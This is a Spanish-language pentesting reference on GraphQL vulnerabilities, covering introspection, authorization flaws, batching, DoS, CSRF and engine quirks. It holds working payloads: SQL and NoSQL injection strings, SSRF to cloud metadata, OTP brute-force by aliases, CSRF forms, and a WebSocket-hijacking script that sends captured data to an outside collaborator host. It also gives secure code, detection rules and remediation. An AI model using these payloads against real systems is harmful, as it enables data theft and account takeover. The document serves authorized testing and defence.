# Vulnerabilidades en GraphQL (GraphQL Security)

| Clasificación | |
|---|---|
| CWE | CWE-285 — Improper Authorization; CWE-639 — Authorization Bypass Through User-Controlled Key; CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor; CWE-770 — Allocation of Resources Without Limits or Throttling; CWE-307 — Improper Restriction of Excessive Authentication Attempts; CWE-352 — Cross-Site Request Forgery |
| OWASP Top 10:2025 | A01 — Broken Access Control; A02 — Security Misconfiguration (introspección, sugerencias, errores); A05 — Injection (argumentos de resolutores); A07 — Authentication Failures (fuerza bruta por lotes) |
| OWASP API Top 10:2023 | API1 BOLA; API3 Broken Object Property Level Authorization; API4 Unrestricted Resource Consumption; API5 BFLA; API8 Security Misconfiguration |
| WSTG | WSTG-APIT-01 — Testing GraphQL (WSTG v4.2) |

**Contenido:** 1. Qué es · 2. Dónde buscar (descubrimiento y huella) · 3. Detección segura · 4. Explotación: 4.1 Introspección · 4.2 Reconstrucción ciega del esquema · 4.3 Autorización en resolutores · 4.4 Inyección en argumentos · 4.5 Lotes y alias (fuerza bruta) · 4.6 Profundidad y complejidad (DoS) · 4.7 Suscripciones · 4.8 CSRF · 4.9 Subidas multipart · 4.10 Particularidades de motores · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

GraphQL es un lenguaje de consulta para APIs: el cliente envía a un único endpoint (normalmente `/graphql`) un documento que describe exactamente qué datos quiere, y el servidor lo resuelve contra un **esquema** (la definición de tipos, campos y operaciones). Hay tres tipos de operación: `query` (lectura), `mutation` (escritura) y `subscription` (eventos en tiempo real, normalmente sobre WebSocket). Cada campo se calcula con una función llamada **resolutor** (*resolver*).

Por qué es un objetivo valioso:

- **El esquema es un mapa completo** de la API; si la *introspección* (la capacidad de GraphQL de describirse a sí mismo) está activa, se obtiene todo en una petición.
- **La autorización se implementa campo a campo** en cada resolutor; basta con olvidarla en un campo anidado para abrir todo el grafo de objetos.
- **Una petición HTTP puede contener cientos de operaciones** (lotes y alias), lo que esquiva limitadores que cuentan peticiones.
- **Las consultas anidadas y recursivas** permiten multiplicar el coste en servidor (denegación de servicio).
- **Los argumentos llegan a SQL, NoSQL, URLs o comandos** como en cualquier API.

## 2. Dónde buscar (señales del reconocimiento)

```bash
for p in /graphql /graphiql /api/graphql /v1/graphql /v2/graphql /graphql/v1 /query /gql /playground \
         /graphql/console /altair /explorer /subscriptions /hasura/v1/graphql /v1alpha1/graphql; do
  r=$(curl -sk -X POST "https://target.example$p" -H "Content-Type: application/json" -d '{"query":"{__typename}"}')
  echo "$r" | grep -q '__typename\|"data"\|"errors"' && echo "[+] $p -> $r"
done
curl -sk "https://target.example/graphql?query=%7B__typename%7D"            # ¿acepta GET?
```

Señales: respuestas `{"data":...}` o `{"errors":[{"message":...}]}`, interfaces GraphiQL, Apollo Sandbox, Altair o GraphQL Playground, cadenas `query`/`mutation`/`fragment` en el JS (`grep -oE '(query|mutation|fragment) [A-Za-z0-9_]+'`), ficheros `.graphql` o *persisted queries* (`extensions.persistedQuery.sha256Hash`), WebSocket con subprotocolo `graphql-transport-ws` o `graphql-ws`.

**Huella del motor** (Apollo, GraphQL Yoga, Hasura, graphene, Strawberry, gqlgen, Hot Chocolate, graphql-java, Sangria, Juniper, AWS AppSync…): determina valores por defecto de introspección, lotes, sugerencias y límites.

```bash
graphw00f -d -f -t https://target.example/graphql     # detectar endpoint y motor
```

## 3. Detección segura (primeras sondas, no destructivas)

1. `{__typename}` para confirmar el endpoint.
2. Auditoría de configuración en una pasada: `graphql-cop -t https://target.example/graphql` (introspección, sugerencias de campos, GET, `application/x-www-form-urlencoded`, lotes, sobrecarga de alias y directivas, duplicación de campos, modo *trace*, errores no controlados). Es poco intrusiva pero envía consultas de prueba de DoS ligeras: revisa el alcance antes.
3. Introspección mínima: `{__schema{queryType{name}}}`.
4. Una consulta con un campo inexistente para ver si devuelve sugerencias («Did you mean…»).
5. Repetir cada operación interesante sin token, con un token de bajo privilegio y con el de otro inquilino.

## 4. Explotación por contexto o tecnología

### 4.1 Introspección

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name } mutationType { name } subscriptionType { name }
    types {
      kind name description
      fields(includeDeprecated: true) { name args { name type { ...T } defaultValue } type { ...T } isDeprecated }
      inputFields { name type { ...T } defaultValue }
      interfaces { ...T }
      enumValues(includeDeprecated: true) { name }
      possibleTypes { ...T }
    }
    directives { name locations args { name type { ...T } } }
  }
}
fragment T on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } }
```

```bash
curl -s https://target.example/graphql -H "Content-Type: application/json" \
  --data @introspection.json | jq '.data.__schema.types[] | select(.kind=="OBJECT") | .name'
```

Carga el JSON en GraphQL Voyager o InQL para visualizar relaciones. Prioriza: mutaciones administrativas, campos `deprecated` (a menudo sin mantenimiento), tipos con `password`, `token`, `secret`, `ssn`, `apiKey`, `internal`, y argumentos `url`, `filter`, `where`, `orderBy`, `raw`.

**Filtros de introspección débiles:** algunos bloqueos son expresiones regulares sobre el texto `__schema{`. Variantes:

```text
{"query":"query{__schema\n{queryType{name}}}"}          salto de línea tras __schema
{"query":"query{__schema  {queryType{name}}}"}          espacios
{"query":"query{__schema,{queryType{name}}}"}           coma (es separador ignorado en GraphQL)
GET  /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
POST con Content-Type: application/x-www-form-urlencoded   query=...
{"query":"{__type(name:\"User\"){fields{name type{name}}}}"}   __type cuando solo filtran __schema
```

### 4.2 Reconstrucción ciega del esquema

Si la introspección está desactivada de verdad:

- **Sugerencias de campos:** `{ __typename usr }` → `Did you mean "user" or "users"?`. Funciona también para argumentos y tipos de entrada.
- **clairvoyance** automatiza la reconstrucción con una lista de palabras:

```bash
clairvoyance https://target.example/graphql -o schema.json -w wordlist.txt
clairvoyance https://target.example/graphql -o schema.json -H "Authorization: Bearer $TOKEN"
```

- **Documentos del cliente:** consultas en JS, apps móviles, *persisted queries* y *source maps*.
- **Apollo Federation:** `{ _service { sdl } }` devuelve el SDL (definición del esquema en texto) de un subgrafo si está expuesto; `_entities` permite resolver objetos por clave.
- **Mensajes de error de tipos:** `{ user(id: true) { id } }` → «Expected type ID!» revela tipos de argumentos.

### 4.3 Autorización en resolutores (BOLA, BFLA, campos)

```graphql
# BOLA directa
query { user(id: "1002") { id email phone role } }

# Relay: IDs globales en base64 "Tipo:id"
#   echo -n "VXNlcjoxMjM=" | base64 -d   →  User:123
query { node(id: "VXNlcjoxMjQ=") { ... on User { id email role } } }

# Anidamiento: el resolutor raíz filtra por ti, el anidado no
query { myOrders { id customer { id email paymentMethods { last4 billingAddress } } } }
query { publicPost(id: 5) { author { email resetToken sessions { ip userAgent } } } }

# Mutaciones con objetos ajenos o campos privilegiados (asignación masiva)
mutation { updateUser(id: "1002", input: { displayName: "poc" }) { id } }
mutation { updateProfile(input: { displayName: "poc", role: ADMIN }) { id role } }
```

⚠️ Mutaciones sobre objetos ajenos modifican datos reales: **requiere confirmación explícita del cliente**; usar objetos de cuentas de prueba.

Recorre el grafo con InQL o Voyager buscando **caminos alternativos** a un mismo tipo sensible: si `User.email` está protegido en `user()`, quizá no lo esté en `comment.author`, `search(...)`, `node(...)`, `_entities(...)` o un campo `deprecated`. Prueba también cursores de paginación Relay (`after:` en base64) modificados.

### 4.4 Inyección en argumentos

Los argumentos llegan a los resolutores igual que los parámetros REST. Usa variables para no pelear con el escapado:

```json
{"query":"query($n:String!){user(name:$n){id email}}","variables":{"n":"admin' OR '1'='1"}}
{"query":"query($f:JSON){users(filter:$f){id}}","variables":{"f":{"username":{"$ne":null}}}}
{"query":"query($f:String){search(filter:$f){id}}","variables":{"f":"{\"$where\":\"sleep(3000)\"}"}}
{"query":"mutation($u:String!){importFeed(url:$u){status}}","variables":{"u":"http://169.254.169.254/latest/meta-data/"}}
{"query":"query($o:String){users(orderBy:$o){id}}","variables":{"o":"id;SELECT pg_sleep(3)"}}
```

Referencias por tipo: `vulns/sqli.md`, `vulns/nosqli.md`, `vulns/ssrf.md`, `vulns/cmdi-rce.md`, `vulns/ssti.md`. sqlmap puede inyectar en el JSON marcando la posición con `*` en un fichero de petición guardado desde Burp (`sqlmap -r req.txt`), siempre tras confirmación manual.

**Escalares personalizados** (`JSON`, `Upload`, `DateTime`, `URL`) validan menos; los argumentos tipo `filter`/`where` de Hasura, PostGraphile o Prisma exponen operadores (`_like`, `_regex`, `startsWith`) que permiten preguntar por campos sensibles (ver la técnica de fuga por ORM en `vulns/api-rest-grpc-websocket.md`).

### 4.5 Lotes y alias: fuerza bruta y elusión de límites

Muchos servidores aceptan un **array de operaciones** en un POST (*batching*) o múltiples **alias** del mismo campo en una consulta. El limitador ve una petición; el servidor ejecuta cientos.

```json
[
 {"query":"mutation{login(email:\"qa@cliente-test.example\",password:\"Spring2026!\"){token}}"},
 {"query":"mutation{login(email:\"qa@cliente-test.example\",password:\"Summer2026!\"){token}}"}
]
```

```graphql
mutation {
  a0: verifyOtp(code: "0000") { success }
  a1: verifyOtp(code: "0001") { success }
  a2: verifyOtp(code: "0002") { success }
}
```

Para **demostrar** el fallo basta con enviar, contra una cuenta de prueba, más intentos en una sola petición que el límite documentado (por ejemplo, 20 alias cuando el límite es 5) y mostrar que se evalúan todos. ⚠️ La fuerza bruta completa de OTP o contraseñas **requiere confirmación explícita del cliente**. Herramientas: CrackQL (`python3 CrackQL.py -t URL -q login.graphql -i creds.csv`), BatchQL, la pestaña de ataques por lotes de InQL.

Los lotes también sirven para **carreras**: varias mutaciones de canje en un mismo documento (ver `vulns/race-condition.md`).

### 4.6 Profundidad, complejidad y denegación de servicio ⚠️

⚠️ Todas las pruebas de esta sección pueden degradar o tumbar el servicio: **requiere confirmación explícita del cliente**, preferiblemente en preproducción. Demostrar con crecimiento medido (profundidad 2, 3, 4 y tiempo de respuesta) y nunca con la carga máxima.

```graphql
# Profundidad sobre relaciones circulares (User.friends: [User])
query { me { friends { friends { friends { id } } } } }

# Sobrecarga de alias sobre un resolutor caro
query { r1: report(year: 2025) { total } r2: report(year: 2025) { total } r3: report(year: 2025) { total } }

# Duplicación de campos y sobrecarga de directivas
query { me { id id id id id id id id } }
query { me { id @include(if: true) @include(if: true) @include(if: true) } }

# Fragmentos circulares (deberían rechazarse en validación según la especificación)
fragment A on User { friends { ...B } }  fragment B on User { friends { ...A } }  query { me { ...A } }

# Paginación sin máximo
query { users(first: 100000) { edges { node { id } } } }
```

Si el servidor soporta `@defer` / `@stream` (entrega incremental), comprueba si los límites de coste se aplican también a esas partes. La sobrecarga de directivas ha provocado fallos reales de *parser* en algunos motores; comprueba la versión concreta del motor contra avisos publicados en lugar de suponerlo.

### 4.7 Suscripciones (WebSocket)

Hay dos protocolos con nombres confusos:

| Biblioteca | Subprotocolo WebSocket | Mensajes |
|---|---|---|
| `graphql-ws` (moderno) | `graphql-transport-ws` | `connection_init`, `subscribe`, `next`, `complete` |
| `subscriptions-transport-ws` (antiguo, sin mantenimiento) | `graphql-ws` | `connection_init`, `start`, `data`, `stop` |

```bash
websocat -H "Sec-WebSocket-Protocol: graphql-transport-ws" wss://target.example/graphql
{"type":"connection_init","payload":{}}
{"id":"1","type":"subscribe","payload":{"query":"subscription{ orderCreated { id total customer { email } } }"}}
```

Pruebas: `connection_init` sin token o con token de otro usuario; suscribirse a eventos de otros usuarios o inquilinos (`messageAdded(roomId: "ajena")`); token caducado durante una conexión abierta; validación del `Origin` (CSWSH, ver `vulns/api-rest-grpc-websocket.md`):

```html
<script>
const ws = new WebSocket("wss://target.example/graphql", "graphql-transport-ws");
ws.onopen = () => {
  ws.send(JSON.stringify({type:"connection_init", payload:{}}));
  ws.send(JSON.stringify({id:"1", type:"subscribe", payload:{query:"subscription{ notifications { text } }"}}));
};
ws.onmessage = e => fetch("https://<tu-colaborador>.oastify.com/g", {method:"POST", body:e.data});
</script>
```

### 4.8 CSRF en GraphQL

Si la sesión va en cookies y el servidor acepta mutaciones por **GET** o con tipos de contenido «simples» (`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`), un formulario de otro sitio puede ejecutarlas sin preflight CORS (ver `vulns/csrf.md`).

```html
<!-- form-urlencoded -->
<form action="https://target.example/graphql" method="POST">
  <input name="query" value='mutation{changeEmail(email:"poc@auditor-test.example"){id}}'>
</form><script>document.forms[0].submit()</script>

<!-- text/plain con cuerpo JSON válido -->
<form action="https://target.example/graphql" method="POST" enctype="text/plain">
  <input name='{"query":"mutation{changeEmail(email:\"poc@auditor-test.example\"){id}}","x":"' value='"}'>
</form>

<!-- GET (si el servidor ejecuta mutaciones por GET) -->
<img src="https://target.example/graphql?query=mutation%7BchangeEmail(email%3A%22poc%40auditor-test.example%22)%7Bid%7D%7D">
```

Condiciones: cookies sin `SameSite=Strict/Lax` efectivo para ese flujo (o ataque desde un sitio hermano), sin cabecera obligatoria tipo `apollo-require-preflight` / `x-apollo-operation-name` y sin token CSRF. Apollo Server 4 activa por defecto la prevención de CSRF (`csrfPrevention`), que exige un tipo de contenido no simple o una de esas cabeceras.

### 4.9 Subidas multipart

La especificación *GraphQL multipart request* define subidas con los campos `operations`, `map` y los ficheros:

```bash
curl -s https://target.example/graphql -H "Cookie: session=SESION_PRUEBA" \
  -F operations='{"query":"mutation($f:Upload!){uploadAvatar(file:$f){url}}","variables":{"f":null}}' \
  -F map='{"0":["variables.f"]}' \
  -F 0=@poc.svg
```

Pruebas: tipo y extensión, SVG con script, nombres con `../`, tamaño (⚠️ subidas grandes: **requiere confirmación explícita del cliente**), y CSRF (multipart es «simple»: Apollo Server 2/3 con `graphql-upload` fue vulnerable a CSRF por esta vía si no había otras defensas). Ver `vulns/file-upload.md`.

### 4.10 Particularidades de motores y plataformas

- **Hasura:** si el *admin secret* no está configurado o se filtra, las cabeceras `x-hasura-admin-secret`, `x-hasura-role` y `x-hasura-user-id` deciden los permisos. Prueba `x-hasura-role: admin` sin secreto y revisa permisos por rol en tablas con relaciones.

```bash
curl -s https://target.example/v1/graphql -H "Content-Type: application/json" \
  -H "x-hasura-role: admin" -d '{"query":"{ users { id email } }"}'
```

- **Apollo / Federation:** `_service { sdl }`, `_entities(representations: [{__typename:"User", id:"1002"}])` para resolver objetos de otros subgrafos sin pasar por el *gateway* de autorización; acceso directo a subgrafos expuestos sin el *router*.
- **Persisted queries (APQ):** si el servidor acepta consultas arbitrarias además de los *hashes* registrados, la lista blanca no protege nada. Prueba enviar una consulta nueva con `extensions.persistedQuery` y un hash calculado por ti.
- **AWS AppSync:** autorización por directivas (`@aws_auth`, `@aws_cognito_user_pools`, `@aws_api_key`); comprueba campos sin directiva y claves de API expuestas en el cliente.
- **Errores verbosos:** `extensions.exception.stacktrace`, rutas de ficheros, SQL, nombres de tablas.

## 5. Evasión de filtros y WAF

- Muchos WAF solo inspeccionan la query string o el JSON superficial; GraphQL permite **mover la carga** a `variables`, a alias, a fragmentos o a un lote.
- **Cambiar el transporte:** POST JSON ↔ GET ↔ `application/x-www-form-urlencoded` ↔ `application/graphql` (cuerpo con la consulta en bruto, soportado por algunos servidores) ↔ multipart.
- **Separadores ignorados por GraphQL:** comas, saltos de línea, tabuladores y comentarios (`# comentario\n`) rompen expresiones regulares.
- **Nombres de operación inocuos:** `query GetProducts { ...carga... }` cuando el filtro decide por `operationName`.
- **Escapes en cadenas:** `"' OR 1=1-- -"` dentro de variables.
- **Directivas y fragmentos inline** para dividir palabras clave sensibles en estructuras distintas.
- Ver `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- Introspección → mutación administrativa olvidada sin autorización → control de cuentas: demostrar en una cuenta de prueba.
- Campo anidado sin autorización (`author.resetToken`) → toma de cuenta: demostrar que el token es válido para la cuenta de prueba, no para usuarios reales.
- Lotes de alias → superación del límite de OTP → 2FA eludible.
- `node(id)` con IDs Relay secuenciales → BOLA masiva: 2–3 registros y estimación del total.
- Suscripción sin autorización por inquilino → flujo en tiempo real de datos ajenos: capturar un evento generado por tu propia cuenta de prueba en otro inquilino.
- CSRF en mutación de cambio de correo → toma de cuenta.
- SSRF en un argumento `url` → metadatos de la nube (`vulns/ssrf.md`).

## 7. Caja blanca: fuentes, sumideros y patrones de código

```js
// VULNERABLE (Apollo Server / Node): sin comprobación de propiedad ni en el raíz ni en el anidado
const resolvers = {
  Query: { order: (_, { id }) => db.orders.findById(id) },
  Order: { customer: (o) => db.users.findById(o.customerId) },     // expone email, pagos...
};
const server = new ApolloServer({ typeDefs, resolvers, introspection: true, csrfPrevention: false,
                                  allowBatchedHttpRequests: true });

// SEGURO: autorización en cada resolutor (o capa de negocio común), límites y CSRF
const resolvers = {
  Query: { order: async (_, { id }, { user }) => {
      const o = await db.orders.findOne({ id, tenantId: user.tenantId });
      if (!o || (o.ownerId !== user.id && !user.can('orders:read:any'))) throw new GraphQLError('Not found');
      return o; } },
  Order: { customer: (o, _, { user }) => policy.canSeeCustomer(user, o) ? db.users.publicProfile(o.customerId) : null },
};
const server = new ApolloServer({ typeDefs, resolvers,
  introspection: process.env.NODE_ENV !== 'production',
  validationRules: [depthLimit(8), createComplexityLimitRule(1000)],   // graphql-depth-limit, graphql-validation-complexity
  // csrfPrevention: true es el valor por defecto en Apollo Server 4; allowBatchedHttpRequests es false por defecto
});
```

```python
# VULNERABLE (graphene-django): todos los campos del modelo y concatenación en SQL
class UserType(DjangoObjectType):
    class Meta: model = User; fields = "__all__"
def resolve_search(root, info, q):
    return User.objects.raw(f"SELECT * FROM auth_user WHERE username LIKE '%{q}%'")

# SEGURO
class UserType(DjangoObjectType):
    class Meta: model = User; fields = ("id", "username")
def resolve_search(root, info, q):
    return User.objects.filter(username__icontains=q, tenant=info.context.user.tenant)[:50]
```

### Consultas para localizarlo

```bash
rg -n "introspection:\s*true|csrfPrevention:\s*false|allowBatchedHttpRequests:\s*true"
rg -n "(NoSchemaIntrospectionCustomRule|depthLimit|createComplexityLimitRule|graphql-armor|costAnalysis|maxAliases)"
rg -n "fields\s*=\s*['\"]__all__['\"]" --type py
rg -n -U "Query:\s*\{[\s\S]{0,400}?findBy(Id|Pk)\(\s*(args\.)?id" --type js --type ts
rg -n "(\$\{[^}]+\}|\+\s*args\.|f\"[^\"]*\{)[^\n]*(SELECT|WHERE|INSERT|UPDATE)" 
rg -n "(graphql-upload|GraphQLUpload|processRequest)"
rg -n "(x-hasura-admin-secret|HASURA_GRAPHQL_ADMIN_SECRET|HASURA_GRAPHQL_UNAUTHORIZED_ROLE)"
```

```yaml
# semgrep: Apollo Server con introspección o sin prevención de CSRF
rules:
  - id: apollo-insecure-config
    languages: [javascript, typescript]
    severity: WARNING
    message: Configuración de Apollo Server insegura para producción
    pattern-either:
      - pattern: new ApolloServer({..., introspection: true, ...})
      - pattern: new ApolloServer({..., csrfPrevention: false, ...})
      - pattern: new ApolloServer({..., allowBatchedHttpRequests: true, ...})
```

Revisa también: directivas de autorización (`@auth`, `@hasRole`) ausentes en tipos o campos concretos; `DataLoader` que cachea entre usuarios distintos (fuga entre peticiones si la caché no es por petición); resolutores de subgrafos federados que confían en que el *router* ya autorizó.

## 8. Falsos positivos frecuentes

- **Introspección activa en un API pública documentada** (por ejemplo, la API GraphQL pública de un producto): es informativo, no una vulnerabilidad, salvo que exponga operaciones internas.
- **Sugerencias de campos** sin datos sensibles detrás: severidad informativa o baja.
- **Lotes aceptados** pero con limitador por operación o por coste: verifica que se ejecutan todas las operaciones y que no hay bloqueo tras N intentos.
- **Errores `200 OK` con `errors`**: GraphQL responde 200 aunque la operación falle; lee el cuerpo, no el código de estado.
- **Campos `null` por autorización**: un campo sensible que vuelve `null` con un error de permisos no es una fuga.
- **Consultas profundas que responden rápido** porque la relación está vacía: prueba con objetos que tengan datos.
- **GET aceptado solo para queries**: no hay CSRF si las mutaciones por GET se rechazan.

## 9. Evidencia mínima para validarlo

- Endpoint, motor identificado y versión si es visible.
- Documento GraphQL exacto, variables, cabeceras de autenticación (usuario de prueba) y respuesta.
- Para autorización: quién hace la petición, a quién pertenece el objeto y por qué no debería verse.
- Para lotes: número de operaciones por petición, límite documentado y respuesta que demuestra que se evaluaron todas.
- Para DoS: tabla de tiempos de respuesta frente a profundidad o número de alias (crecimiento), sin llegar a la caída.
- Para CSRF: PoC HTML y captura de la mutación ejecutada en la cuenta de prueba.
- Esquema obtenido (introspección o reconstrucción) adjunto como anexo cuando sea relevante.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Impacto demostrado | CVSS 3.1 | CVSS 4.0 (vector; calcular la puntuación en FIRST) |
|---|---|---|
| Introspección o sugerencias que revelan operaciones internas | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → 5.3 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| BOLA en query o campo anidado (lectura de datos personales) | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → 6.5 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| CSRF en mutación sensible (cambio de correo) | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` → 8.1 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| DoS sin autenticación por profundidad o alias (demostrado por tiempos) | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` → 7.5 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| Lotes que eluden el límite de OTP/login → toma de cuenta sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → 9.1 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Mutación administrativa sin autorización | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` → 8.8 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |

## 11. Remediación (con ejemplo de código correcto)

- **Autorización en la capa de negocio**, invocada desde cada resolutor (incluidos los anidados, `node`, `_entities` y suscripciones), con denegación por defecto.
- **Introspección y sugerencias desactivadas en producción** (como defensa en profundidad, no como control principal); errores genéricos sin trazas.
- **Límites de coste:** profundidad máxima (7–10), número de alias, número de operaciones por lote (o lotes desactivados), coste por consulta, tamaño máximo de página, tiempo máximo de ejecución.
- **Persisted queries como lista blanca** en APIs privadas: rechazar documentos no registrados.
- **CSRF:** exigir `Content-Type: application/json` o una cabecera personalizada; rechazar mutaciones por GET; cookies `SameSite`.
- **Limitación de frecuencia por operación** (no por petición HTTP) en login, OTP y acciones caras.
- **Suscripciones:** autenticación en `connection_init`, autorización por evento y por inquilino, cierre al caducar el token, validación de `Origin`.
- **Consultas parametrizadas** en todos los resolutores; validación de escalares personalizados.

```js
// GraphQL Yoga + GraphQL Armor: límites y enmascarado de errores
import { createYoga } from 'graphql-yoga';
import { EnvelopArmorPlugin } from '@escape.tech/graphql-armor';
const yoga = createYoga({
  schema,
  maskedErrors: true,
  graphiql: false,
  batching: false,
  plugins: [EnvelopArmorPlugin({
    maxDepth: { n: 8 }, maxAliases: { n: 15 }, maxDirectives: { n: 20 },
    costLimit: { maxCost: 5000 }, maxTokens: { n: 1000 }, blockFieldSuggestion: { enabled: true },
  })],
});
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Comando / uso |
|---|---|
| graphw00f | Detectar endpoint y motor: `graphw00f -d -f -t https://target.example/graphql` |
| graphql-cop | Auditoría de configuración: `graphql-cop -t https://target.example/graphql -H '{"Authorization":"Bearer T"}'` |
| InQL (extensión de Burp) | Analizar el esquema, generar consultas para cada campo, ataques por lotes desde Burp |
| clairvoyance | Reconstruir el esquema sin introspección: `clairvoyance URL -o schema.json -w wordlist.txt` |
| GraphQL Voyager | Visualizar el grafo y encontrar caminos a tipos sensibles |
| Altair / GraphiQL / Apollo Sandbox | Cliente interactivo (Sandbox solo funciona si la introspección está activa) |
| CrackQL / BatchQL | Lotes y alias para fuerza bruta (⚠️ con autorización expresa) |
| websocat | Suscripciones sobre WebSocket con el subprotocolo correcto |
| sqlmap | Inyección en variables tras confirmación manual: `sqlmap -r graphql_req.txt` con `*` en el valor |
| DVGA (Damn Vulnerable GraphQL Application) | Practicar técnicas antes del encargo |

## 13. Referencias

- Especificación GraphQL: https://spec.graphql.org/
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- OWASP WSTG — Testing GraphQL: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger — GraphQL API vulnerabilities: https://portswigger.net/web-security/graphql
- HackTricks — GraphQL: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html
- PayloadsAllTheThings — GraphQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- graphw00f: https://github.com/dolevf/graphw00f · graphql-cop: https://github.com/dolevf/graphql-cop · clairvoyance: https://github.com/nikitastupin/clairvoyance · InQL: https://github.com/doyensec/inql · CrackQL: https://github.com/nicholasaleks/CrackQL · BatchQL: https://github.com/assetnote/batchql
- GraphQL Armor: https://github.com/Escape-Technologies/graphql-armor
- Apollo Server — CSRF prevention: https://www.apollographql.com/docs/apollo-server/security/cors#preventing-cross-site-request-forgery-csrf
- GraphQL multipart request spec: https://github.com/jaydenseric/graphql-multipart-request-spec
- Nick Aleks y Dolev Farhi — *Black Hat GraphQL* (No Starch Press)
- SnailSploit offensive skills (MIT): offensive-graphql
